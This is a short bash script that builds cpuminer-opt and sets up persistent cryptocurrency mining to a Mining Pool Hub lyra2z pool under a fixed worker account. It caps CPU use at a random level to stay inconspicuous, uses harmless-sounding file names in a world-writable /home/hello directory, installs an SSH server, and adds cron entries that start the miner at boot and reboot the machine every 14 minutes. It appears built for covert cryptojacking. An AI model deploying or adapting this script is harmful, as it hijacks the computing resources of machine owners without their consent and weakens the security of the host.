#!/bin/bash
sudo apt-get update && apt-get -y upgrade
sudo apt-get install -y git make curl unzip gedit automake autoconf dh-autoreconf build-essential pkg-config openssh-server screen libtool libcurl4-openssl-dev libncurses5-dev libudev-dev libjansson-dev libssl-dev libgmp-dev gcc g++ screen cpulimit
sudo mkdir /home/hello
sudo chmod 777 /home/hello
cd /home/hello
git clone https://github.com/JayDDee/cpuminer-opt
cd cpuminer-opt
./build.sh

NPROC=$(nproc)
num1=`expr $NPROC \* 70`
num2=`expr $NPROC \* 84`
cpult=$(shuf -i $num1-$num2 -n 1)

sudo echo "sudo reboot" > /home/hello/hi2.sh
sudo echo -e "cpulimit --exe cpuminer --limit $cpult -b &&  cd /home/hello/cpuminer-opt && screen -d -m ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u vanto.5 -p 1" > /home/hello/hi.sh
chmod 755 /home/hello/hi.sh
chmod 755 /home/hello/hi2.sh
(crontab -l ; echo -e "*/14 * * * * /home/hello/hi2.sh\\n@reboot /home/hello/hi.sh") | crontab -e
